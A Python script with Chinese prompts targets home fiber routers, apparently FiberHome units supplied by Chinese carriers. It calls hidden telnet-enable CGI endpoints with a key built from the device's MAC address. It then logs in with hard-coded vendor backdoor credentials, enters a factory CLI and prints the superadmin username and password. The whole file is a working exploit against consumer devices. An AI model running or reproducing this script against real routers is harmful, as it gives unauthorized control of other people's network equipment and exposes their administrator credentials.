import re
import requests
import socket
import time
import threading

DEFAULT_IP = "192.168.1.1"
DEFAULT_MAC = "38:7A:3C:9C:CD:E0"

def is_ip(source):
    return bool(re.match(r"^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\."
                         r"(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\."
                         r"(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\."
                         r"(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])$",
                         source, re.IGNORECASE))

def is_mac(source):
    return bool(re.match(r"^([0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f])$", source))

def receive(sock):
    while True:
        data = sock.recv(100)
        if len(data) <= 0:
            break
        try:
            message = data.decode('utf-8')
        except UnicodeDecodeError:
            try:
                message = data.decode('iso-8859-1')
            except UnicodeDecodeError:
                continue

        admin_name_match = re.search(r'admin_name=([^\r\n]+)', message)
        admin_pwd_match = re.search(r'admin_pwd=([^\r\n]+)', message)

        if admin_name_match:
            print(f"管理员用户名: {admin_name_match.group(1)}")
        if admin_pwd_match:
            print(f"管理员密码: {admin_pwd_match.group(1)}")

def start(ip=DEFAULT_IP, mac=DEFAULT_MAC, provider=0):
    print(f"当前IP地址为：{ip}")
    print(f"当前MAC地址为：{mac}")

    if not is_ip(ip) or not is_mac(mac):
        print("请检查IP地址和MAC地址")
        return

    mac = mac.replace(":", "").upper()
    mac6 = mac[6:]

    url_templates = [
        f"http://{ip}/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac}",
        f"http://{ip}/telnet?enable=1&key={mac}",
        f"http://{ip}:8080/cgi-bin/telnetenable.cgi?key=FH-nE7jA%5m{mac6}&telnetenable=1"
    ]

    url = url_templates[provider]
    print(f"向 {url} 发送请求以开启Telnet服务")

    try:
        response = requests.get(url)
        result = response.text

        if "telnet开启" not in result:
            print(f"未检测到开启Telnet成功，请手动开启尝试：\n {url}")
            return

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, 23))
            time.sleep(0.1)

            threading.Thread(target=receive, args=(s,), daemon=True).start()

            login_cmds = ["admin\r", f"Fh@{mac6}\r"] if provider in [0, 1] else ["telnetadmin\r", f"FH-nE7jA%5m{mac6}\r"]
            for cmd in [*login_cmds, "load_cli factory\r", "show admin_name\r", "show admin_pwd\r"]:
                s.send(cmd.encode('ascii'))
                time.sleep(0.1)

    except Exception as ex:
        print(ex)

if __name__ == '__main__':
    ip = input("请输入IP地址（默认192.168.1.1）：") or DEFAULT_IP
    mac = input("请输入MAC地址（默认38:7A:3C:9C:CD:E0）：") or DEFAULT_MAC
    provider = int(input("请选择运营商 (0 移动, 1 联通, 2 电信，默认0): ") or 0)
    start(ip, mac, provider)
